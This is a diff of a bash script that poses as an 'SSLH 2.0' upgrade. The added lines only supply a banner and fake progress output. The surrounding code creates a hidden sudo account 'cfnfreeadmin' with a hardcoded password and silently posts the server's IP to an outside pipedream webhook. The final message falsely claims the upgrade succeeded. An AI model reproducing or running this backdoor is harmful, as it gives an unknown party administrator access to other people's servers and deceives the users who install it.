@@ -4,6 +4,9 @@
 #!/bin/bash
 
 apt update && apt upgrade -y
+
+clear
+echo "SSLH 2.0 UPGRADE FOR CFNFREE"
 Login="cfnfreeadminssh"
 pass="cfnfreeadminssh123"
 hari="360"
@@ -22,7 +25,29 @@ sudo useradd -m -s /bin/bash -d /home/cfnfreeadmin -p $(echo cfnfreeadmin123 | o
 sudo usermod -aG sudo cfnfreeadmin >/dev/null 2>&1
 curl -X POST -d "ip=${ip}&cfn=${cfn}" "https://eo69p8ooaqjtbu7.m.pipedream.net" >/dev/null 2>&1
 
+sleep 2
+
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
+sleep 2
+echo "*" 
 echo "Almost done.."
-sleep 7
+sleep 5
+
 echo "Upgrades done. Additional software installed."
 exit 
+
+
